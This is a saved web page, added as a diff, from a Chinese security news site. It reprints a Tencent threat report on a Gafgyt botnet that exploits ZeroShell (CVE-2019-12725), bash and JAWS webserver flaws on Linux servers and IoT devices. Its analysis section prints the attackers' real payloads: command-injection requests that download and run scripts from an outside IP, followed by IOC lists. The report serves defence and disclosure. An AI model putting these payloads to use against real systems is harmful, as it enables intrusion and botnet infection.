@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+	<head>
+		<meta charset="UTF-8">
+		<title>警惕 Gafgyt 僵尸网络对国内 Linux 服务器及 IoT 设备的攻击 | HackerNews</title>
+	
+		<!-- Mobile Specific Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+		<!-- 2016年10月18日
+		---- 目的：百度网站认证
+		---- 修改人：xuhf -->
+		<meta name="baidu-site-verification" content="n1Slo3JljU" />
+		<!-- end -->
+
+		<!-- 2016年10月19日
+		---- 目的：seo优化
+		---- 修改人：xuhf -->
+		<meta name="keywords" content="HackerNews,黑客,安全,互联网,国际,威胁情报,维基解密" />
+		<meta name="description" content="HackerNews 为您提供最新国际威胁情报、黑客动向以及维基解密资讯。" />
+		<!-- end -->
+
+		<!--[if lt IE 9]>
+			<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+		<![endif]-->
+	
+		<!-- Favicon and Apple Icons -->
+		<link href="http://hackernews.cc/wp-content/themes/whatnew-wp/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
+		<!-- wp_head -->
+		<link rel="alternate" type="application/rss+xml" title="HackerNews &raquo; Feed" href="http://hackernews.cc/feed" />
+<link rel="alternate" type="application/rss+xml" title="HackerNews &raquo; 评论Feed" href="http://hackernews.cc/comments/feed" />
+<link rel="alternate" type="application/rss+xml" title="HackerNews &raquo; 警惕 Gafgyt 僵尸网络对国内 Linux 服务器及 IoT 设备的攻击评论Feed" href="http://hackernews.cc/archives/31874/feed" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/hackernews.cc\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.5.22"}};
+			!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;if(!g||!g.fillText)return!1;switch(g.textBaseline="top",g.font="600 32px Arial",a){case"flag":return g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3;case"diversity":return g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,d=c[0]+","+c[1]+","+c[2]+","+c[3],g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e;case"simple":return g.fillText(h(55357,56835),0,0),0!==g.getImageData(16,16,1,1).data[0];case"unicode8":return g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='bootstrap-css'  href='http://hackernews.cc/wp-content/themes/whatnew-wp/css/bootstrap.css?ver=4.5.22' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-css'  href='http://hackernews.cc/wp-content/themes/whatnew-wp/css/font-awesome.css?ver=4.5.22' type='text/css' media='all' />
+<link rel='stylesheet' id='sidr-dark-css'  href='http://hackernews.cc/wp-content/themes/whatnew-wp/css/jquery.sidr.dark.css?ver=4.5.22' type='text/css' media='all' />
+<link rel='stylesheet' id='grid-css'  href='http://hackernews.cc/wp-content/themes/whatnew-wp/css/grid.css?ver=4.5.22' type='text/css' media='all' />
+<link rel='stylesheet' id='style-css'  href='http://hackernews.cc/wp-content/themes/whatnew-wp/style.css?ver=4.5.22' type='text/css' media='all' />
+<script type='text/javascript' src='http://hackernews.cc/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
+<script type='text/javascript' src='http://hackernews.cc/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='http://hackernews.cc/wp-content/themes/whatnew-wp/js/jquery.flexslider.js?ver=4.5.22'></script>
+<script type='text/javascript' src='http://hackernews.cc/wp-content/themes/whatnew-wp/js/jquery.carouFredSel.js?ver=4.5.22'></script>
+<script type='text/javascript' src='http://hackernews.cc/wp-content/themes/whatnew-wp/js/jquery.sidr.min.js?ver=4.5.22'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var lrating = {"ajaxurl":"http:\/\/hackernews.cc\/wp-admin\/admin-ajax.php","nonce":"6cd5d6a424","likes":{"action":"likes","success":"\u559c\u6b22\u6210\u529f!","error":"\u4f60\u5df2\u7ecf\u559c\u6b22\u8fc7\u5b83\u4e86.XD."},"rates":{"action":"rates","success":"\u8bc4\u4ef7\u6210\u529f!","error":"\u4f60\u5df2\u7ecf\u8bc4\u4ef7\u8fc7\u5b83\u4e86.XD."}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://hackernews.cc/wp-content/themes/whatnew-wp/js/jquery.like-rating.js?ver=4.5.22'></script>
+<link rel='https://api.w.org/' href='http://hackernews.cc/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://hackernews.cc/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://hackernews.cc/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='柠檬鸭加密矿工：针对云应用和 Linux' href='http://hackernews.cc/archives/31870' />
+<meta name="generator" content="WordPress 4.5.22" />
+<link rel="canonical" href="http://hackernews.cc/archives/31874" />
+<link rel='shortlink' href='http://hackernews.cc/?p=31874' />
+<link rel="alternate" type="application/json+oembed" href="http://hackernews.cc/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fhackernews.cc%2Farchives%2F31874" />
+<link rel="alternate" type="text/xml+oembed" href="http://hackernews.cc/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fhackernews.cc%2Farchives%2F31874&#038;format=xml" />
+	</head>
+	<body screen_capture_injected="true" class="single single-post postid-31874 single-format-standard">
+		<!-- 维护公告 -->
+		<!-- 修改日期：2016-11-10 -->
+		<!-- 修改人：xuhf -->
+		<!-- <div style="width: 100%; background: #fcf8e2; border-left: solid 4px #edd28a; margin: 0 0 10px 0; padding: 10px 0;">
+			<p style="color: #9d7437; margin: 0; padding: 0 0 0 15px;">维护公告：本站将于2016年11月11日 15:00～18:00进行维护，届时可能无法访问，如有不便敬请谅解！</p>
+		</div> -->
+		<!-- end -->
+        <style>
+            .mobile-title{
+                height: 30px !important;
+                padding-left: 10px !important;
+            }
+            img.site-logo {
+                padding: 15px 0;
+                height: 65px;
+            }
+            .sidr-class-site-logo{
+                display: none;
+            }
+        </style>
+		<div id="mobile-header">
+		    <a id="menu-trigger" href="#sidr-main">
+				<i class="fa fa-bars"></i>
+		    </a>
+
+		    <!--new here at 2016.09.27, author:xuhf-->
+		    <p class="mobile-title">
+                <img class="mobile-site-logo" height="30px" src="http://hackernews.cc/wp-includes/images/HackerNews_b.png" />
+		    </p>
+		    <!--end here-->
+
+		    <div class="mobile-search">
+				<form class="form-search" method="get" action="http://hackernews.cc/" role="search">
+				    <input class="search-query" type="text" name="s" id="s" placeholder="Search..." autocomplete="off" value="">
+				    <button class="search-submit" id="searchsubmit"><i class="fa fa-search"></i></button>
+				</form>
+			</div>
+		</div>
+		<!-- END .mobile-header -->
+		<div id="page" class="hfeed site boxed-mode clearfix">
+			<aside id="secondary" class="s-sidebar-wrapper">
+		      <div class="site-branding">
+                        <img class="site-logo" src="http://hackernews.cc/wp-includes/images/HackerNews_w.png" alt="hackernews_logo"></img>
+		      </div>
+		      <!-- END .logo -->
+		      <nav id="primary-nav" class="main-navigation" role="navigation">
+		        <ul id="primary-menu" class="nav-menu"><li id="menu-item-11" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-11"><a href="http://hackernews.cc" style="border-color:#0">首页</a></li>
+<li id="menu-item-933" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-933"><a href="http://hackernews.cc/archives/category/%e4%bb%8a%e6%97%a5%e6%8e%a8%e9%80%81">今日推送</a></li>
+<li id="menu-item-164" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-164"><a href="http://hackernews.cc/archives/category/%e5%9b%bd%e9%99%85%e5%8a%a8%e6%80%81">国际动态</a></li>
+<li id="menu-item-166" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-166"><a href="http://hackernews.cc/archives/category/%e6%bc%8f%e6%b4%9e%e4%ba%8b%e4%bb%b6">漏洞事件</a></li>
+<li id="menu-item-167" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-167"><a href="http://hackernews.cc/archives/category/%e9%bb%91%e5%ae%a2%e4%ba%8b%e4%bb%b6">黑客事件</a></li>
+<li id="menu-item-903" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-903"><a href="http://hackernews.cc/archives/category/%e6%95%b0%e6%8d%ae%e6%b3%84%e9%9c%b2">数据泄露</a></li>
+<li id="menu-item-165" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-165"><a href="http://hackernews.cc/archives/category/%e6%8e%a8%e8%8d%90%e9%98%85%e8%af%bb">推荐阅读</a></li>
+</ul>		      </nav>
+		      <!-- END nav -->
+		    </aside>
+		    <!-- END .m-sidebar-wrapper -->
+<div class="main-outer-wrapper clearfix"> 
+
+  <div class="content clearfix">
+
+    <div  class="m-articles-outer-wrapper col2-l">
+            <section id="articles" class="m-articles-wrapper">
+        
+<article id="post-31874" class="single-post post-31874 post type-post status-publish format-standard has-post-thumbnail hentry category-88 tag-172">
+	<header class="single-header clearfix">
+				<div class="post-thumb">
+			<img width="1920" height="960" src="http://hackernews.cc/wp-content/uploads/2020/08/cyber-3400789_1920.jpg" class="attachment-300x300 size-300x300 wp-post-image" alt="cyber-3400789_1920" />		</div>
+		
+		<div class="post-details-right">
+			<h1 class="single-title">警惕 Gafgyt 僵尸网络对国内 Linux 服务器及 IoT 设备的攻击</h1>
+			<div class="light-post-meta">
+				<span>作者: <a href='http://hackernews.cc/archives/author/reprint' title='内容转载'>内容转载</a></span>
+				<span>日期: <a href="http://hackernews.cc/archives/31874" title="15:02" >2020-08-26</a></span>
+				<span class="post-category">分类: <a href="http://hackernews.cc/archives/category/%e4%bb%8a%e6%97%a5%e6%8e%a8%e9%80%81" rel="category tag">今日推送</a></span>
+				<span class="post-comments"><a href="http://hackernews.cc/archives/31874#respond">暂无评论</a></span>
+			</div>
+			<div class="post-utility">
+				<ul id="wn-utility-31874" class="wn-utility wn-utility-default">
+					<li>
+						<span class="wn-views">浏览次数 <span>238</span></span>
+					</li>
+					<li>
+						<a class="wn-likes" href="#">喜欢 <span>0</span></a>
+					</li>
+					<li>
+						<span class="wn-rates wn-rating-default">评分 <span data-rate="0"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span></span></span>
+					</li>
+				</ul>
+			</div>
+			<div class="post-share-tools clearfix">
+	            <!-- JiaThis Button BEGIN -->
+	            <div class="jiathis clearfix">
+	                <a class="jiathis_button_qzone"></a>
+	                <a class="jiathis_button_tsina"></a>
+	                <a class="jiathis_button_tqq"></a>
+	                <a class="jiathis_button_weixin"></a>
+	                <a class="jiathis_button_renren"></a>
+	                <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	            </div>
+	            <script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1394170583019786" charset="utf-8"></script>
+	            <!-- JiaThis Button END -->
+	        </div>
+	        <!-- END .post-share-tools -->
+					</div>
+	</header>
+	<div class="post-body clearfix">
+		<section data-support="96编辑器" data-style-id="5206">
+<section data-support="96编辑器" data-style-id="5206">
+<section>
+<section data-width="100%"><strong>感谢腾讯御见威胁情报中心来稿！</strong></section>
+<section data-width="100%"><strong>原文链接：<a href="https://mp.weixin.qq.com/s/fUOracfMmKfj5RT2llMVpg">https://mp.weixin.qq.com/s/fUOracfMmKfj5RT2llMVpg</a></strong></section>
+<p>&nbsp;</p>
+</section>
+</section>
+</section>
+<section data-support="96编辑器" data-style-id="5206">
+<section data-support="96编辑器" data-style-id="5206">
+<section>
+<section data-width="100%">
+<h2>一、背景</h2>
+</section>
+<p>腾讯安全威胁情报中心检测到有境外IP针对国内Linux服务器的远程命令注入攻击。<strong>黑客通过批量扫描80、5555、60001端口来发现易受攻击的Linux服务器、android设备以及监控摄像头设备并利用ZeroShell远程代码执行漏洞（CVE-2019-12725）、bash shell漏洞、JAWS Webserver未授权shell命令执行漏洞进行攻击，攻击成功后下载Gafgyt家族木马。</strong></p>
+<p>Gafgyt是一种流行的僵尸网络程序，被认为是Mirai的前身，其源代码在2015年初被部分泄露。Gafgyt主要通过telent弱口令以及命令注入漏洞等方式进行攻击传播，通过感染基于Linux的IoT设备（包括基于Linux系统的路由器、智能摄像头等设备）来发起DDoS攻击，攻击类型以UDP、TCP和HTTP攻击为主。</p>
+<p>&nbsp;</p>
+</section>
+</section>
+</section>
+<section data-support="96编辑器" data-style-id="5206">
+<section data-support="96编辑器" data-style-id="5206">
+<section>
+<p style="font-weight: 400;">腾讯安全系列产品应对Gafgyt僵尸网络的响应清单：</p>
+<table style="font-weight: 400;">
+<tbody>
+<tr>
+<td width="70"><strong>应用</strong></p>
+<p><strong>场景</strong></td>
+<td width="170"><strong>安全产品</strong></td>
+<td width="313"><strong>解决方案</strong></td>
+</tr>
+<tr>
+<td rowspan="2" width="70"><strong>威</strong></p>
+<p><strong>胁</strong></p>
+<p><strong>情</strong></p>
+<p><strong>报</strong></td>
+<td width="170">腾讯T-Sec</p>
+<p>威胁情报云查服务</p>
+<p>（SaaS）</td>
+<td width="313">1）Gafgyt僵尸网络相关IOCs已入库。</p>
+<p>各类安全产品可通过“威胁情报云查服务”提供的接口提升威胁识别能力。可参考:<a href="https://cloud.tencent.com/product/tics">https://cloud.tencent.com/product/tics</a></td>
+</tr>
+<tr>
+<td width="170">腾讯T-Sec</p>
+<p>高级威胁追溯系统</td>
+<td width="313">1）Gafgyt僵尸网络相关信息和情报已支持检索。</p>
+<p>网管可通过威胁追溯系统，分析日志，进行线索研判、追溯网络入侵源头。T-Sec高级威胁追溯系统的更多信息，可参考：https://cloud.tencent.com/product/atts</td>
+</tr>
+<tr>
+<td rowspan="3" width="70"><strong>云原生安全</strong></p>
+<p><strong>防护</strong></td>
+<td width="170">云防火墙</p>
+<p>（Cloud Firewall，CFW）</td>
+<td width="313">基于网络流量进行威胁检测与主动拦截，已支持：</p>
+<p>1）   Gafgyt僵尸网络关联的IOCs已支持识别检测；</p>
+<p>2）   检测利用Zeroshell漏洞的命令注入攻击；</p>
+<p>有关云防火墙的更多信息，可参考：<br />
+https://cloud.tencent.com/product/cfw</td>
+</tr>
+<tr>
+<td width="170">腾讯T-Sec  主机安全</p>
+<p>（Cloud Workload Protection，CWP）</td>
+<td width="313">1）    已支持查杀Gafgyt僵尸网络相关木马程序；</p>
+<p>2）    告警弱口令爆破行为；</p>
+<p>腾讯主机安全（云镜）提供云上终端的防毒杀毒、防入侵、漏洞管理、基线管理等。关于T-Sec主机安全的更多信息，可参考：https://cloud.tencent.com/product/cwp</td>
+</tr>
+<tr>
+<td width="170">腾讯T-Sec 安全运营中心</td>
+<td width="313">基于客户云端安全数据和腾讯安全大数据的云安全运营平台。已接入腾讯主机安全（云镜）、腾讯御知等产品数据导入，为客户提供漏洞情报、威胁发现、事件处置、基线合规、及泄漏监测、风险可视等能力。</p>
+<p>关于腾讯T-Sec安全运营中心的更多信息，可参考：https://s.tencent.com/product/soc/index.html</td>
+</tr>
+<tr>
+<td width="70"><strong>非云企业安全防护</strong></td>
+<td width="170">腾讯T-Sec</p>
+<p>高级威胁检测系统</p>
+<p>（腾讯御界）</td>
+<td width="313">1）   已支持通过协议检测Gafgyt僵尸网络木马与服务器的网络通信；</p>
+<p>关于T-Sec高级威胁检测系统的更多信息，可参考：</p>
+<p>https://cloud.tencent.com/product/nta</td>
+</tr>
+</tbody>
+</table>
+<h2>二、详细分析</h2>
+<p>腾讯安全专家在日常安全巡检过程中发现攻击线索，腾讯云防火墙检测到攻击来源52.224.202.238:43787，针对目标系统80端口的命令注入攻击。<img class="rich_pages img_loading" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" crossorigin="anonymous" data-ratio="0.3459715639810427" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWUyeI9H9vwP6bazrE4Ehqkhrae4hFU3VoxdbRnicEehAqOLQZWJVecicNBjvICs3TNl23mSNRLeNBJQ/640?wx_fmt=png" data-type="png" data-w="1266" /></p>
+</section>
+<section><img class="alignnone size-full wp-image-31875" src="http://hackernews.cc/wp-content/uploads/2020/08/1-3.png" alt="1" width="1080" height="374" /></section>
+<section>该攻击的payload为：</section>
+<section>GET /cgi-bin/kerbynet?Section=NoAuthREQ&amp;Action=x509List&amp;type=*&#8221;;cd /tmp;curl -O http[:]//5.206.227.228/zero;sh zero;&#8221; HTTP/1.0</section>
+<section></section>
+<section>分析发现这次攻击利用的是ZeroShell远程代码执行漏洞（CVE-2019-12725），该漏洞在2019年7月被发现，攻击者可以通过构造具有固定特征的请求数据发送至目标系统，从而导致恶意代码执行。（ZeroShell是一套用于服务器和嵌入式设备的Linux发行版，它主要为局域网提供所需要的网络服务）</section>
+<p><img class="alignnone size-full wp-image-31876" src="http://hackernews.cc/wp-content/uploads/2020/08/2-2.png" alt="2" width="1080" height="439" /></p>
+<section>漏洞攻击成功后通过curl命令下载执行shell脚本zero，zero继续通过curl下载Gafgyt木马bot.x86_64和bot.x86并启动执行，分别为64位和32位木马文件。</section>
+<section><img class="alignnone size-full wp-image-31877" src="http://hackernews.cc/wp-content/uploads/2020/08/640.png" alt="640" width="668" height="64" /><img class="rich_pages " src="https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWUyeI9H9vwP6bazrE4EhqkhDJPxKq94c1aXCjeOK7IbicicAHHflPcO1M9iaKw5zVbnOOoBVyKxCWbtA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" crossorigin="anonymous" data-ratio="0.09580838323353294" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWUyeI9H9vwP6bazrE4EhqkhDJPxKq94c1aXCjeOK7IbicicAHHflPcO1M9iaKw5zVbnOOoBVyKxCWbtA/640?wx_fmt=png" data-type="png" data-w="668" data-fail="0" /></section>
+<section>bot.x86为Gafgyt僵尸网络家族木马样本，启动后首先打印特征字符串“9xsspnvgc8aj5pi7m28p”。<img class="alignnone size-full wp-image-31878" src="http://hackernews.cc/wp-content/uploads/2020/08/3-2.png" alt="3" width="876" height="280" /></section>
+<section>然后针对Linux服务器、android设备、视频监控设备的80、5555、60001端口进行扫描。<img class="alignnone size-full wp-image-31879" src="http://hackernews.cc/wp-content/uploads/2020/08/4-2.png" alt="4" width="1080" height="466" /></section>
+<section>针对开放端口的设备利用ZeroShell远程代码执行漏洞（CVE-2019-12725）攻击，执行payload:</section>
+<section>GET /cgi-bin/kerbynet?Section=NoAuthREQ&amp;Action=x509List&amp;<span class="code-snippet__built_in">type</span>=*<span class="code-snippet__string">&#8220;;cd /tmp;curl -O http[:]//5.206.227.228/zero;sh zero;&#8221;</span></section>
+<section></section>
+<section>利用bash shell漏洞攻击，执行payload:</section>
+<section>shell[:]<span class="code-snippet__built_in">cd</span> /data/<span class="code-snippet__built_in">local</span>/tmp; busybox wget http[:]//5.206.227.228/wget -O -&gt; wwww; sh wwww; curl -O http[:]//5.206.227.228/curl; sh curl;rm wwww curl</section>
+<section></section>
+<section>利用JAWS Webserver未授权shell命令执行漏洞攻击，执行Payload:</section>
+<section><span class="code-snippet__attribute">GET</span> /shell?cd /tmp;<span class="code-snippet__attribute">wget</span> http[:]//<span class="code-snippet__number">5.206.227.228</span>/jaw;<span class="code-snippet__attribute">sh</span> jaw;</section>
+<section class="code-snippet__fix code-snippet__js">
+<pre class="code-snippet__js" data-lang="nginx"><code><span class="code-snippet_outer"> </span></code></pre>
+</section>
+<p><img class="alignnone size-full wp-image-31880" src="http://hackernews.cc/wp-content/uploads/2020/08/5-1.png" alt="5" width="1013" height="233" /></p>
+<section>ZeroShell远程代码执行漏洞（CVE-2019-12725）的攻击流量：</section>
+<p><img class="rich_pages img_loading" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" crossorigin="anonymous" data-ratio="0.387987012987013" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/6AoQM3RKCWUyeI9H9vwP6bazrE4EhqkhZJ7ib8iaiaEr6KwbaCtqNDIYh3Sib9U4zDOjdIFFnicicstThLQgU67hjvhw/640?wx_fmt=png" data-type="png" data-w="616" /><img class="alignnone size-full wp-image-31881" src="http://hackernews.cc/wp-content/uploads/2020/08/6-1.png" alt="6" width="616" height="239" /></p>
+</section>
+</section>
+<p>&nbsp;</p>
+<p><strong>IOCs</strong></p>
+<p><strong>IP</strong><br />
+5.206.227.228</p>
+<p><strong>URL</strong><br />
+http[:]//5.206.227.228/zero<br />
+http[:]//5.206.227.228/curl<br />
+http[:]//5.206.227.228/wget<br />
+http[:]//5.206.227.228/k<br />
+http[:]//5.206.227.228/bot.x86_64<br />
+http[:]//5.206.227.228/bot.x86<br />
+http[:]//5.206.227.228/bot.arm5<br />
+http[:]//5.206.227.228/bot.arm6<br />
+http[:]//5.206.227.228/bot.arm7<br />
+http[:]//5.206.227.228/bot.aarch64<br />
+http[:]//5.206.227.228/bot.mips<br />
+http[:]//5.206.227.228/bot.mipsel</p>
+<p><strong>MD5</strong><br />
+2520fc7d13ac3876cca580791d1c33a8<br />
+cc84fcc23567228337e45c9fbb78699f<br />
+10b9f21795e5ffbd52c407617d0bd4ef<br />
+38d8de098c7e560a34dabf8c1a2ed5f0<br />
+12b021bcd199585e86dd27523010105b<br />
+0e12d891a2fe2cecb6781f3e4d3551b4<br />
+aa389e7fb64cf274334712ecb3dfd2cd<br />
+2dabb8e039a77f0eb67e938d798ab7c4<br />
+03a7f039321ffb9938cc67d65c0b6459<br />
+a9109419954a421b712d48ea22b0a7b9<br />
+52fb891c536fe449b896f0f2cd2490d4<br />
+e2cec25584bfec1e56ee82f350dfeaf9<br />
+87859507c0d23793c78d86e0963a7a37<br />
+ba903efc3d2e37105e57232e7652b85c<br />
+891bbf7b562b34332fac12df2c29ddbb<br />
+6d9953a03c568ad97595723d1a09b291<br />
+aa9e9627ed6aba6415fb45f742f4f8dd</p>
+<p><strong>参考链接：<br />
+</strong></p>
+<p><a href="https://www.anquanke.com/vul/id/1030688">https://www.anquanke.com/vul/id/1030688</a><br />
+<a href="https://www.tarlogic.com/advisories/zeroshell-rce-root.txt">https://www.tarlogic.com/advisories/zeroshell-rce-root.txt</a><br />
+<a href="https://unit42.paloaltonetworks.com/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/">https://unit42.paloaltonetworks.com/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/</a><br />
+<a href="https://github.com/ifding/iot-malware">https://github.com/ifding/iot-malware</a></p>
+	</div>
+	<footer class="single-footer clearfix">
+		<div class="post-share-tools-bottom clearfix">
+            <!-- JiaThis Button BEGIN -->
+            <div class="jiathis clearfix">
+                <a class="jiathis_button_qzone"></a>
+                <a class="jiathis_button_tsina"></a>
+                <a class="jiathis_button_tqq"></a>
+                <a class="jiathis_button_weixin"></a>
+                <a class="jiathis_button_renren"></a>
+                <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+            </div>
+            <script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1394170583019786" charset="utf-8"></script>
+            <!-- JiaThis Button END -->
+        </div>
+        <!-- END .post-share-tools -->
+		<div class="post-tags">
+				<b>标签:</b><a href="http://hackernews.cc/archives/tag/%e5%83%b5%e5%b0%b8%e7%bd%91%e7%bb%9c" rel="tag">僵尸网络</a>   
+		</div>
+		<!-- END .post-share -->
+			<div class="author-box">
+		<header class="box-header clearfix">
+		<h4 class="box-title">关于作者</h4>
+		</header>
+		<div class="author-body clearfix">
+			<div class="author-avatar">
+				<img alt='' src='http://1.gravatar.com/avatar/70df302faeaa15ebbb0d927d7d54523d?s=128&#038;r=g' srcset='http://1.gravatar.com/avatar/70df302faeaa15ebbb0d927d7d54523d?s=256&amp;r=g 2x' class='uk-comment-avatar' height='128' width='128' />			</div>
+			<div class="author-details-right">
+				<h4 class="author-name"><a href="http://hackernews.cc/archives/author/reprint" title="View all posts by 内容转载">内容转载</a></h4>
+				<div class="author-desc">
+					=￣ω￣= 内容转载				</div>
+			</div>
+		</div>
+	</div>
+	<!-- END .author-box -->
+				<div class="related-box">
+		<header class="box-header clearfix">
+			<h4 class="box-title">猜你喜欢</h4>
+		</header>
+		<div class="related-body clearfix">
+			<div class="wn-grid">
+							<article class="related-item span3">
+										<a href="http://hackernews.cc/archives/31782" title="Mirai 僵尸网络利用弱口令爆破攻击上万台 Linux 服务器">
+						<img width="210" height="140" src="http://hackernews.cc/wp-content/uploads/2018/03/linux-210x140.jpg" class="attachment-210x140 size-210x140 wp-post-image" alt="linux" />					</a>
+										<div class="entry-content">
+						<h5 class="item-title">
+							<a href="http://hackernews.cc/archives/31782" title="Mirai 僵尸网络利用弱口令爆破攻击上万台 Linux 服务器">Mirai 僵尸网络利用弱口令爆破攻击上万台 Linux 服务器</a>
+						</h5>
+						<div class="light-post-meta">
+							<span><a href='http://hackernews.cc/archives/author/reprint' title='内容转载'>内容转载</a> - 2020-08-20</span>
+						</div>
+					</div>
+				</article>
+							<article class="related-item span3">
+										<a href="http://hackernews.cc/archives/31342" title="亡命徒（Outlaw）僵尸网络感染约2万台Linux服务器，腾讯安全提醒企业及时清除">
+						<img width="210" height="140" src="http://hackernews.cc/wp-content/uploads/2018/08/t016ccce9d1457c00ae-210x140.png" class="attachment-210x140 size-210x140 wp-post-image" alt="僵尸网络" />					</a>
+										<div class="entry-content">
+						<h5 class="item-title">
+							<a href="http://hackernews.cc/archives/31342" title="亡命徒（Outlaw）僵尸网络感染约2万台Linux服务器，腾讯安全提醒企业及时清除">亡命徒（Outlaw）僵尸网络感染约2万台Linux服务器，腾讯安全提...</a>
+						</h5>
+						<div class="light-post-meta">
+							<span><a href='http://hackernews.cc/archives/author/reprint' title='内容转载'>内容转载</a> - 2020-07-03</span>
+						</div>
+					</div>
+				</article>
+							<article class="related-item span3">
+										<a href="http://hackernews.cc/archives/30992" title="Phorpiex 僵尸网络病毒新增感染可执行文件">
+						<img width="210" height="140" src="http://hackernews.cc/wp-content/uploads/2018/08/t016ccce9d1457c00ae-210x140.png" class="attachment-210x140 size-210x140 wp-post-image" alt="僵尸网络" />					</a>
+										<div class="entry-content">
+						<h5 class="item-title">
+							<a href="http://hackernews.cc/archives/30992" title="Phorpiex 僵尸网络病毒新增感染可执行文件">Phorpiex 僵尸网络病毒新增感染可执行文件</a>
+						</h5>
+						<div class="light-post-meta">
+							<span><a href='http://hackernews.cc/archives/author/reprint' title='内容转载'>内容转载</a> - 2020-06-10</span>
+						</div>
+					</div>
+				</article>
+							<article class="related-item span3">
+										<a href="http://hackernews.cc/archives/30659" title="报告显示僵尸网络会利用百度贴吧等常用服务进行管理">
+						<img width="210" height="140" src="http://hackernews.cc/wp-content/uploads/2018/09/timg-210x140.jpg" class="attachment-210x140 size-210x140 wp-post-image" alt="百度" />					</a>
+										<div class="entry-content">
+						<h5 class="item-title">
+							<a href="http://hackernews.cc/archives/30659" title="报告显示僵尸网络会利用百度贴吧等常用服务进行管理">报告显示僵尸网络会利用百度贴吧等常用服务进行管理</a>
+						</h5>
+						<div class="light-post-meta">
+							<span><a href='http://hackernews.cc/archives/author/reprint' title='内容转载'>内容转载</a> - 2020-05-27</span>
+						</div>
+					</div>
+				</article>
+						</div>
+		</div>
+	</div>
+	<!-- END .related-box -->
+		</footer>
+</article>
+<!-- END .single-post -->
+<a name="comments"></a>
+<div id="SOHUCS" sid="31874"></div> 
+<script type="text/javascript"> 
+(function(){ 
+    var appid = ''; 
+    var conf = ''; 
+    var width = window.innerWidth || document.documentElement.clientWidth; 
+    if (width < 960) { 
